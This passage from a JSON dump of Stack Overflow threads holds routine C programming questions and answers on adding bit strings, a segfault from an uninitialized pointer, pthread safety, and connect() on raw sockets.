Then it will work for as many digits as you can wish for (but obviously but not huge). that can be done in a single small loop."}, {"owner": {"reputation": 16233, "user_id": 4253229, "user_type": "registered", "accept_rate": 83, "profile_image": "https://lh4.googleusercontent.com/-e2FAQvlj5CQ/AAAAAAAAAAI/AAAAAAAAAqM/TlSnekirgNE/photo.jpg?sz=128", "display_name": "Eugene Sh.", "link": "https://stackoverflow.com/users/4253229/eugene-sh"}, "edited": false, "score": 0, "creation_date": 1482958862, "post_id": 41369478, "comment_id": 69940882, "body": "Are you coming from VHDL/Verilog background by a chance?"}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1482959394, "post_id": 41369478, "comment_id": 69941098, "body": "Note that this code is broken; this gives a result of <code>10</code> for <code>11 + 11</code>.  If it weren&#39;t broken, I would say put it on Code Review. But as it stands, it seems appropriate here."}, {"owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "edited": false, "score": 0, "creation_date": 1482959823, "post_id": 41369478, "comment_id": 69941264, "body": "I think I fixed it, just a matter of changing <code>R = &#39;0&#39;;                 carry = 1;</code> in the beginning."}, {"owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "reply_to_user": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482959969, "post_id": 41369478, "comment_id": 69941331, "body": "@WeatherVane I&#39;ll appreciate an answer a little more verbose."}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1482959986, "post_id": 41369478, "comment_id": 69941336, "body": "Also consider <code>char c[] = &quot;00&quot;;</code>. And, it is generally a bad idea to modify your code once you post a question. Add an update, or an edit, or a self-answer if you like."}, {"owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "edited": false, "score": 0, "creation_date": 1482960346, "post_id": 41369478, "comment_id": 69941443, "body": "Didn&#39;t understand this part &quot;Also consider char c[] = &quot;00&quot;;&quot;, may I ask for a brief explanation?"}, {"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 0, "creation_date": 1482960491, "post_id": 41369478, "comment_id": 69941510, "body": "@KcFnMi-- you are modifying the string <code>&quot;00&quot;</code> to contain the result, but this string cannot possibly contain the result of <code>&quot;11&quot; + &quot;11&quot;</code>."}], "answers": [{"comments": [{"owner": {"reputation": 15451, "user_id": 6879826, "user_type": "registered", "accept_rate": 80, "profile_image": "https://i.stack.imgur.com/WzqBC.png?s=128&g=1", "display_name": "ad absurdum", "link": "https://stackoverflow.com/users/6879826/ad-absurdum"}, "edited": false, "score": 1, "creation_date": 1482960188, "post_id": 41369852, "comment_id": 69941391, "body": "Aside from that <code>void main()</code> is wrong, this code is broken for the same reason that OP&#39;s code is broken. See my comments under the original question."}, {"owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "edited": false, "score": 0, "creation_date": 1482960484, "post_id": 41369852, "comment_id": 69941507, "body": "Question was broken, now I think is ok."}, {"owner": {"reputation": 1594, "user_id": 2307520, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c54159b7271fa1f3705314ed8b42f8da?s=128&d=identicon&r=PG", "display_name": "David162795", "link": "https://stackoverflow.com/users/2307520/david162795"}, "edited": false, "score": 2, "creation_date": 1482960987, "post_id": 41369852, "comment_id": 69941709, "body": "When you provide data containment smaller, then possible result, of course you will get overflow. This code won&#39;t cause any memory access error in that case, it just wont store the last bit anywhere, which is similar behavior to how adding integers works in C. Using dynamic realloc seems like overkill for this task. Maybe, you may print an error message and force close the program, when carry bit stays set at the end of the loop."}, {"owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "edited": false, "score": 0, "creation_date": 1482962608, "post_id": 41369852, "comment_id": 69942362, "body": "For <code>char a[] = &quot;0011&quot;;</code>, <code>char b[] = &quot;0011&quot;;</code> it returns <code>0110</code>. I was expecting <code>0100</code>. Is it correct?"}, {"owner": {"reputation": 112912, "user_id": 2410359, "user_type": "registered", "accept_rate": 87, "profile_image": "https://i.stack.imgur.com/pIl9T.png?s=128&g=1", "display_name": "chux - Reinstate Monica", "link": "https://stackoverflow.com/users/2410359/chux-reinstate-monica"}, "reply_to_user": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "edited": false, "score": 2, "creation_date": 1482963068, "post_id": 41369852, "comment_id": 69942520, "body": "@KcFnMi 3 plus 3 is 4 or 6?"}], "tags": [], "owner": {"reputation": 1594, "user_id": 2307520, "user_type": "registered", "accept_rate": 71, "profile_image": "https://www.gravatar.com/avatar/c54159b7271fa1f3705314ed8b42f8da?s=128&d=identicon&r=PG", "display_name": "David162795", "link": "https://stackoverflow.com/users/2307520/david162795"}, "is_accepted": true, "score": 0, "last_activity_date": 1482961019, "last_edit_date": 1482961019, "creation_date": 1482959996, "answer_id": 41369852, "question_id": 41369478, "link": "https://stackoverflow.com/questions/41369478/adding-bits-simpler/41369852#41369852", "title": "Adding bits, simpler", "body": "<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nvoid sum_two_charbitsets(int char_count,char*a,char*b,char*result)\n{\n    int x,i,carry = 0;\n    for(i = char_count-1; i &gt;= 0; i--)\n    {\n      x=(a[i]-'0')+(b[i]-'0')+carry;\n      result[i]=(x&amp;1)+'0';\n      carry=x&gt;&gt;1;   \n    } \n}\n\nint main(int argc, char *argv[])\n{\n    char a[] = \"01\";\n    char b[] = \"01\";\n    char c[] = \"00\";\n    sum_two_charbitsets(2,a,b,c);\n    printf(\"%s\\n\", c);\n}\n</code></pre>\n\n<p>When doing numerical operations, why not use numbers instead of hard to read code full of string comparing and stuff?</p>\n\n<p>In order to use numerical plus operator, I used simple char&lt;->int conversions by subtracting/adding ASCII number of char '0'. Which would work as long as the strings contains only expected characters '0' or '1'.</p>\n\n<p><code>number&amp;1</code> is used to subtract first bit from integer using binary AND operator.</p>\n\n<p><code>number&gt;&gt;1</code> is binary shift operator, which would discard the first bit, moving second bit to the first position => effectively subtracting it. (as long as no other bit is ever set, which should not happen for correct input data) </p>\n"}], "owner": {"reputation": 4020, "user_id": 5082463, "user_type": "registered", "accept_rate": 74, "profile_image": "https://www.gravatar.com/avatar/877843e34372342a80c73f38ee79ad60?s=128&d=identicon&r=PG&f=1", "display_name": "KcFnMi", "link": "https://stackoverflow.com/users/5082463/kcfnmi"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 101, "favorite_count": 0, "accepted_answer_id": 41369852, "answer_count": 1, "score": 0, "last_activity_date": 1482961019, "creation_date": 1482957987, "last_edit_date": 1482959783, "question_id": 41369478, "link": "https://stackoverflow.com/questions/41369478/adding-bits-simpler", "title": "Adding bits, simpler", "body": "<p>Considering that two bitsets are provided in the form of strings, <code>char a[]</code> and <code>char b[]</code>, as in the code below. And the task of add that bitsets is given. I take it and wrote the following to sum the two bitsets:</p>\n\n<pre><code>#include &lt;stdio.h&gt;\n#include &lt;string.h&gt;\n\nint carry = 0;\nchar result(char r, int c) {\n    char R = '0';\n    if (carry) {\n        if (c) {\n            R = '0';\n            carry = 1;\n        } else {\n            R = r == '0' ? '1' : '0';\n            carry = R == '0' ? 1 : 0;\n        }\n    } else {\n        if (c) {\n            R = '0';\n            carry = 1;\n        } else {\n            R = r;\n            carry = 0;\n        }\n    }\n    return R;\n}\n\nchar sum(int x, int y) {\n    char r = '0';\n    if (x ^ y) \n        r = result('1', 0);\n    else if (x &amp; y)\n        r = result('0', 1);\n    else \n        r = result('0', 0);\n    return r;\n}\n\nint main() { \n    char a[] = \"01\";\n    char b[] = \"01\";\n    char c[] = \"00\";\n    for (int i = strlen(c)-1; i &gt; -1; i--) \n        c[i] = sum(a[i] == '0' ? 0 : 1, b[i] == '0' ? 0 : 1);\n    printf(\"%s\\n\", c);\n}\n</code></pre>\n\n<p>Is it possible to make it simpler?</p>\n"}, {"tags": ["c", "segmentation-fault"], "comments": [{"owner": {"reputation": 115745, "user_id": 119527, "user_type": "registered", "accept_rate": 89, "profile_image": "https://i.stack.imgur.com/lTjBL.png?s=128&g=1", "display_name": "Jonathon Reinhart", "link": "https://stackoverflow.com/users/119527/jonathon-reinhart"}, "edited": false, "score": 1, "creation_date": 1482957988, "post_id": 41369411, "comment_id": 69940508, "body": "Always use <code>gcc -Wall -Werror</code>. It would stop you from passing <code>val</code> uninitialized to <code>get_get_flag()</code>."}, {"owner": {"reputation": 7421, "user_id": 6782754, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/99008d0e4c4c15ab03d77938ad9e345b?s=128&d=identicon&r=PG", "display_name": "Gerhardh", "link": "https://stackoverflow.com/users/6782754/gerhardh"}, "edited": false, "score": 0, "creation_date": 1482960192, "post_id": 41369411, "comment_id": 69941394, "body": "Not exactly causing your trouble, but empty parameter lists for your functions have been a bit outdated since the late eighties of the previous century."}], "answers": [{"tags": [], "owner": {"reputation": 10998, "user_id": 1458617, "user_type": "registered", "accept_rate": 72, "profile_image": "https://www.gravatar.com/avatar/0790c4e75c14c45344fef4937aac2e8a?s=128&d=identicon&r=PG", "display_name": "Rudolfs Bundulis", "link": "https://stackoverflow.com/users/1458617/rudolfs-bundulis"}, "is_accepted": true, "score": 1, "last_activity_date": 1482957788, "creation_date": 1482957788, "answer_id": 41369442, "question_id": 41369411, "link": "https://stackoverflow.com/questions/41369411/same-code-works-in-main-but-not-in-other-function/41369442#41369442", "title": "Same code works in main() but not in other function", "body": "<p>You have not initialized the <code>cap_flag_value_t * val;</code> - the call to <code>cap_get_flag</code> writes to it and then it may/may not crash depending on the memory location that was written. Change those lines to:</p>\n\n<pre><code>cap_flag_value_t val;\ncap_get_flag(caps, CAP_FOWNER, CAP_EFFECTIVE, &amp;val);\n</code></pre>\n"}], "owner": {"reputation": 221, "user_id": 2849491, "user_type": "registered", "accept_rate": 38, "profile_image": "https://graph.facebook.com/948496018502300/picture?type=large", "display_name": "Nudin", "link": "https://stackoverflow.com/users/2849491/nudin"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 130, "favorite_count": 0, "accepted_answer_id": 41369442, "answer_count": 1, "score": -1, "last_activity_date": 1482957788, "creation_date": 1482957614, "question_id": 41369411, "link": "https://stackoverflow.com/questions/41369411/same-code-works-in-main-but-not-in-other-function", "title": "Same code works in main() but not in other function", "body": "<p>How can I be, that some code works in the main-function but crashes with a segmentation fault when moved in a function? What's the difference?</p>\n\n<p>This Works:</p>\n\n<pre><code>#include &lt;sys/capability.h&gt;\n#include &lt;sys/types.h&gt;\n\nint\nmain() {\n\n\n    cap_t caps;\n    caps = cap_get_proc();\n    cap_flag_value_t * val;\n    cap_get_flag(caps, CAP_FOWNER, CAP_EFFECTIVE, val);\n    cap_free(caps);\n\n\n    return 0;\n}\n</code></pre>\n\n<p>This doesn't work:</p>\n\n<pre><code>#include &lt;sys/capability.h&gt;\n#include &lt;sys/types.h&gt;\n\nvoid\nmy_get_cap() { \n    cap_t caps;\n    caps = cap_get_proc();\n    cap_flag_value_t * val;\n    cap_get_flag(caps, CAP_FOWNER, CAP_EFFECTIVE, val);\n    cap_free(caps);\n}\n\nint\nmain() {\n    my_get_cap();\n    return 0;\n}\n</code></pre>\n"}, {"tags": ["c", "multithreading", "thread-safety", "pthreads"], "comments": [{"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1482957216, "post_id": 41369298, "comment_id": 69940202, "body": "No, you cannot assume that. <code>mon_param</code> is a local variable but not what it points to. So if another thread changes any of the values being pointed to you will have unpredictable results."}, {"owner": {"reputation": 3, "user_id": 5663527, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ea19f041c74d1151d79a76f48cf19ca?s=128&d=identicon&r=PG&f=1", "display_name": "Entwickler", "link": "https://stackoverflow.com/users/5663527/entwickler"}, "reply_to_user": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1482957467, "post_id": 41369298, "comment_id": 69940320, "body": "sorry.. for the type. It is actually mon_param and  not &quot;mon&quot;.. I had to change it back due to a change i made to the return value."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1482957643, "post_id": 41369298, "comment_id": 69940377, "body": "Doesn&#39;t matter. The parameter name makes no difference to the fact that the code is not thread safe."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 1, "creation_date": 1482957698, "post_id": 41369298, "comment_id": 69940400, "body": "Whatever <code>current_row</code> is, it is not local."}, {"owner": {"reputation": 3, "user_id": 5663527, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ea19f041c74d1151d79a76f48cf19ca?s=128&d=identicon&r=PG&f=1", "display_name": "Entwickler", "link": "https://stackoverflow.com/users/5663527/entwickler"}, "edited": false, "score": 1, "creation_date": 1482957732, "post_id": 41369298, "comment_id": 69940412, "body": "BTW, this function is invoked from within a thread function handler.... IMO, each thread will have its own call stack and hence, the call to this function will receive the parameters passed to by a particular thread..is not my understanding correct? mon_param is not a global variable shared between the thread... are you telling me that the thread function itself has to be mutually exclusive?"}, {"owner": {"reputation": 3, "user_id": 5663527, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ea19f041c74d1151d79a76f48cf19ca?s=128&d=identicon&r=PG&f=1", "display_name": "Entwickler", "link": "https://stackoverflow.com/users/5663527/entwickler"}, "edited": false, "score": 0, "creation_date": 1482957792, "post_id": 41369298, "comment_id": 69940440, "body": "Wether vane.. Sorry about that, that&#39;s my mistake..it will be passed to the function as a parameter..I edited that.."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 1, "creation_date": 1482957825, "post_id": 41369298, "comment_id": 69940452, "body": "You haven&#39;t shown us what <code>mon_param</code> points to. If it points to something that only this thread uses then that&#39;s fine and the code is thread safe if used only in that way. But since we can&#39;t see that code we are only commenting in general (and in general the code is not thread safe). That&#39;s why it is always important to provide a <a href=\"https://stackoverflow.com/help/minimal-reproducible-example\">minimal reproducible example</a> to avoid having to waste time extracting info from you bit by bit."}, {"owner": {"reputation": 31114, "user_id": 4142924, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/KmZTf.png?s=128&g=1", "display_name": "Weather Vane", "link": "https://stackoverflow.com/users/4142924/weather-vane"}, "edited": false, "score": 0, "creation_date": 1482957996, "post_id": 41369298, "comment_id": 69940512, "body": "OMG another &quot;something like my code&quot; where we have to debug the &quot;something like&quot; before the <i>actual code</i> is posted. Please post the <a href=\"http://stackoverflow.com/help/mcve\">Minimal, Complete, and Verifiable example</a> that shows the problem."}, {"owner": {"reputation": 3, "user_id": 5663527, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ea19f041c74d1151d79a76f48cf19ca?s=128&d=identicon&r=PG&f=1", "display_name": "Entwickler", "link": "https://stackoverflow.com/users/5663527/entwickler"}, "edited": false, "score": 0, "creation_date": 1482958039, "post_id": 41369298, "comment_id": 69940530, "body": "I shall take note of that from next time.. sorry about that.."}, {"owner": {"reputation": 11194, "user_id": 3003365, "user_type": "registered", "profile_image": "https://i.stack.imgur.com/dP9Od.jpg?s=128&g=1", "display_name": "kaylum", "link": "https://stackoverflow.com/users/3003365/kaylum"}, "edited": false, "score": 0, "creation_date": 1482958173, "post_id": 41369298, "comment_id": 69940585, "body": "&quot;are functions receiving pointers as parameters thread-safe&quot;. BTW, the direct answer to that question is NO. But that&#39;s not what you are really asking anyway. You have constraints which that question alone does not capture so that question should be reworded."}, {"owner": {"reputation": 3, "user_id": 5663527, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ea19f041c74d1151d79a76f48cf19ca?s=128&d=identicon&r=PG&f=1", "display_name": "Entwickler", "link": "https://stackoverflow.com/users/5663527/entwickler"}, "edited": false, "score": 0, "creation_date": 1482960699, "post_id": 41369298, "comment_id": 69941600, "body": "Ok, I am really sorry that my posting was not upto the standards..this is my first post and hence the mistake.. nevertheless i shall take care from next time.."}], "answers": [{"tags": [], "owner": {"reputation": 711, "user_id": 4727279, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/73d441d6adaf35bce40f482794a66af4?s=128&d=identicon&r=PG&f=1", "display_name": "papadp", "link": "https://stackoverflow.com/users/4727279/papadp"}, "is_accepted": false, "score": 1, "last_activity_date": 1482957844, "creation_date": 1482957844, "answer_id": 41369455, "question_id": 41369298, "link": "https://stackoverflow.com/questions/41369298/in-the-below-code-get-row-of-machine-receiving-mon-param-as-a-parameter-thread/41369455#41369455", "title": "In the below code: get_row_of_machine receiving mon_param as a parameter thread-safe?", "body": "<p>In short, <strong>no</strong>.</p>\n\n<p>The way to make parameters thread safe is by design.</p>\n\n<p>There is no fool proof way to do this or a rule of thumb. If you know your codes design well enough and you <em>know</em> no other thread will access the same struct then it's possibly thread safe. </p>\n\n<p>If you do know some other thread might try to access the struct you can use all sorts of synchronization primitives like <a href=\"https://en.wikipedia.org/wiki/Mutual_exclusion\" rel=\"nofollow noreferrer\">mutexes</a>, <a href=\"https://en.wikipedia.org/wiki/Critical_section\" rel=\"nofollow noreferrer\">critical sections</a>, <a href=\"https://en.wikipedia.org/wiki/Semaphore_(programming)\" rel=\"nofollow noreferrer\">semaphores</a> or more generally <a href=\"https://en.wikipedia.org/wiki/Lock_(computer_science)\" rel=\"nofollow noreferrer\">locks</a>.</p>\n"}], "owner": {"reputation": 3, "user_id": 5663527, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/7ea19f041c74d1151d79a76f48cf19ca?s=128&d=identicon&r=PG&f=1", "display_name": "Entwickler", "link": "https://stackoverflow.com/users/5663527/entwickler"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 31, "favorite_count": 0, "answer_count": 1, "score": -1, "last_activity_date": 1482960650, "creation_date": 1482957084, "last_edit_date": 1482960650, "question_id": 41369298, "link": "https://stackoverflow.com/questions/41369298/in-the-below-code-get-row-of-machine-receiving-mon-param-as-a-parameter-thread", "title": "In the below code: get_row_of_machine receiving mon_param as a parameter thread-safe?", "body": "<p>mon_param is allocated memory by the main process invoking the thread function.\nThis function will be invoked by multiple threads.So, can I safely assume that it is thread safe as I am using only the variables on the stack?</p>\n\n<pre><code>struct table* get_row_of_machine(int row_num,struct mon_agent *mon_param)\n{\n    struct table *table_row = mon_param-&gt;s_table_rows;\n    if(row_num &lt; mon_param-&gt;total_states)\n    {\n        table_row = table_row + row_num;        \n    }\n    return table_row;\n}\n\n\n//in the main function code goes like this .... \nint main()\n{\n    int msg_type,ret;\n    while(!s_interrupted)\n    {\n\n        inter_thread_pair = zsock_new(ZMQ_PAIR);\n        if(inter_thread_pair != NULL)\n            zsock_bind (inter_thread_pair, \"inproc://zmq_main_pair\");\n\n            int ret_val = zmq_poll(&amp;socket_items[0], 1, 0); // Do not POLL indefinitely.\n            if(socket_items[0].revents &amp; ZMQ_POLLIN)\n            {   \n                char *msg = zstr_recv (inter_thread_pair); //\n                if(msg != NULL)     \n                {\n                    struct mon_agent *mon_params;  \n                    //This is where mon_params is getting its memory\n\n                    mon_params = (struct mon_agent*)malloc(sizeof(struct mon_agent));\n                    msg_type = get_msg_type(msg);\n\n                    if(msg_type == /*will check for some message type here*/)\n                    {\n                         struct thread_sock_params *thd_sock = create_connect_pair_socket(thread_count);\n                         // copy the contents of thread_sock_params and also the mon_params to this struct\n\n                         struct thread_parameters parameters;\n                         parameters.sock_params = thd_sock;\n                         parameters.params = mon_params; //mon_params getting copid here.\n\n                         //Every time I receive a particular message, I create a new thread and pass on the parameters.\n                         //So, each thread gets its own mon_params memory allocated.\n\n\n                     ret = pthread_create(&amp;thread,NULL,monitoring_thread,(void*)&amp;parameters);\n\n                    and then it goes on like this.\n\n                    }\n\n                }    \n\n            }   \n\n\n        and the code continues..... there is a breakpoint somewhere down..\n    }\n\n}\n\nvoid* mon_thread(void *data)\n{\n\n    //  First time data is sent as a function parameter and later will be received as messages.\n    struct thread_parameters *th_param = (struct thread_parameters *)data;\n    struct mon_agent *mon_params = th_param-&gt;params;\n\n    zsock_t* thread_pair_client = zsock_new(ZMQ_PAIR);\n    //printf(\"Value of socket is %s: \\n\",th_param-&gt;socket_ep);\n    rc = zsock_connect(thread_pair_client,th_param-&gt;sock_params-&gt;socket_ep);\n    if(rc == -1)\n    {\n      printf(\"zmq_connect failed in monitoring thread.\\n\");\n    }\n\n    while(!s_interrupted)\n    {   \n        int row;\n        //logic to maintain the curent row.\n        //also receive other messages from thread_pair_client  czmq socket.\n        run_machine(row,mon_params);                \n\n    }\n\n}\n\n\nvoid run_machine(int row_num, struct mon_agent *mon_params)\n{   \n    struct table* table_row = get_row_of_state_machine(row_num,mon_param);\n}\n</code></pre>\n"}, {"tags": ["c++", "c", "sockets", "tcp", "raw-sockets"], "comments": [{"owner": {"reputation": 288867, "user_id": 207421, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/5cfe5f7d64f44be04f147295f5c7b88e?s=128&d=identicon&r=PG", "display_name": "user207421", "link": "https://stackoverflow.com/users/207421/user207421"}, "edited": false, "score": 0, "creation_date": 1482964715, "post_id": 41369086, "comment_id": 69943086, "body": "What else would it do? Strange question."}], "answers": [{"comments": [{"owner": {"reputation": 21, "user_id": 7311413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5914d10821e2f26263b5c5d4c69a2646?s=128&d=identicon&r=PG&f=1", "display_name": "Arthur James", "link": "https://stackoverflow.com/users/7311413/arthur-james"}, "edited": false, "score": 0, "creation_date": 1482976859, "post_id": 41369172, "comment_id": 69946128, "body": "Well see, I have the second parameter as <code>SOCK_RAW</code> but it&#39;s coupled with <code>IPPROTO_TCP</code> as the third parameter. In retrospect I should have clarified, I apologize. I am wondering how the two together would effect the behavior of <code>connect</code>."}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "reply_to_user": {"reputation": 21, "user_id": 7311413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5914d10821e2f26263b5c5d4c69a2646?s=128&d=identicon&r=PG&f=1", "display_name": "Arthur James", "link": "https://stackoverflow.com/users/7311413/arthur-james"}, "edited": false, "score": 0, "creation_date": 1482980743, "post_id": 41369172, "comment_id": 69946950, "body": "In this case, I would not expect connect to actually succeed. Never tried it myself, but I would expect it to fail."}, {"owner": {"reputation": 21, "user_id": 7311413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5914d10821e2f26263b5c5d4c69a2646?s=128&d=identicon&r=PG&f=1", "display_name": "Arthur James", "link": "https://stackoverflow.com/users/7311413/arthur-james"}, "edited": false, "score": 0, "creation_date": 1482985302, "post_id": 41369172, "comment_id": 69947846, "body": "Why would you expect it not to succeed?"}, {"owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "reply_to_user": {"reputation": 21, "user_id": 7311413, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/5914d10821e2f26263b5c5d4c69a2646?s=128&d=identicon&r=PG&f=1", "display_name": "Arthur James", "link": "https://stackoverflow.com/users/7311413/arthur-james"}, "edited": false, "score": 2, "creation_date": 1483023746, "post_id": 41369172, "comment_id": 69966272, "body": "@ArthurJames, because <code>connect</code> would require one of the higher level socket types, like &#39;SOCK_STREAM&#39; or &#39;SOCK_DGRAM&#39; type, not <code>SOCK_RAW</code>. Does it work in your experiment?"}], "tags": [], "owner": {"reputation": 55924, "user_id": 5245033, "user_type": "registered", "accept_rate": 53, "profile_image": "https://www.gravatar.com/avatar/6dbfd37ccb940fd2afcd49e966ad97e4?s=128&d=identicon&r=PG&f=1", "display_name": "SergeyA", "link": "https://stackoverflow.com/users/5245033/sergeya"}, "is_accepted": true, "score": 1, "last_activity_date": 1482956506, "creation_date": 1482956506, "answer_id": 41369172, "question_id": 41369086, "link": "https://stackoverflow.com/questions/41369086/connect-function-in-raw-socket/41369172#41369172", "title": "Connect function in raw socket?", "body": "<p>Yes, <code>IPPROTO_TCP</code> creates TCP socket. To use raw socket, you need to pass SOCK_RAW as second argument to the <code>socket</code> function.</p>\n"}, {"tags": [], "owner": {"reputation": 449279, "user_id": 65863, "user_type": "registered", "accept_rate": 75, "profile_image": "https://www.gravatar.com/avatar/f00013ceab8fb1928885c5c172fbfd4a?s=128&d=identicon&r=PG", "display_name": "Remy Lebeau", "link": "https://stackoverflow.com/users/65863/remy-lebeau"}, "is_accepted": false, "score": 1, "last_activity_date": 1483049120, "creation_date": 1483049120, "answer_id": 41387833, "question_id": 41369086, "link": "https://stackoverflow.com/questions/41369086/connect-function-in-raw-socket/41387833#41387833", "title": "Connect function in raw socket?", "body": "<p>Per MSDN documentation:</p>\n\n<p><a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ms740548.aspx\" rel=\"nofollow noreferrer\">TCP/IP Raw Sockets</a></p>\n\n<blockquote>\n  <p>Once an application creates a socket of type <code>SOCK_RAW</code>, this socket may be used to send and receive data. <strong>All packets sent or received on a socket of type <code>SOCK_RAW</code> are treated as datagrams on an unconnected socket</strong>.</p>\n  \n  <p>The following rules apply to the operations over <code>SOCK_RAW</code> sockets:</p>\n  \n  <p>...</p>\n  \n  <p>Received datagrams are copied into all <code>SOCK_RAW</code> sockets that satisfy the following conditions:</p>\n  \n  <p>...</p>\n  \n  <ul>\n  <li>If a foreign address is defined for the socket, it should correspond to the source address as specified in the IP header of the received datagram. <strong>An application may specify the foreign IP address by calling the <code>connect</code> or <code>WSAConnect</code> function</strong>. If no foreign IP address is specified for the socket, the datagrams are copied into the socket regardless of the source IP address in the IP header of the received datagram.</li>\n  </ul>\n</blockquote>\n\n<p>This implies that RAW sockets are essentially connection-less sockets, and thus <code>connect()</code> <em>does not</em> perform a 3-way TCP handshake on a RAW socket. It simply associates a remote address with the socket, similar to how <code>connect()</code> works with a UDP (<code>SOCK_DGRAM</code>) socket.</p>\n\n<p>More importantly:</p>\n\n<blockquote>\n  <p>Limitations on Raw Sockets</p>\n  \n  <p>...</p>\n  \n  <ul>\n  <li><p><strong>TCP data cannot be sent over raw sockets.</strong>\n  ...</p></li>\n  <li><p><strong>A call to the <code>bind</code> function with a raw socket for the <code>IPPROTO_TCP</code> protocol is not allowed.</strong></p></li>\n  </ul>\n</blockquote>\n\n<p>So you can't use <code>IPPROTO_TCP</code> with a RAW socket to begin with, so the matter of <code>connect()</code> behavior on a RAW TCP socket is moot. <a 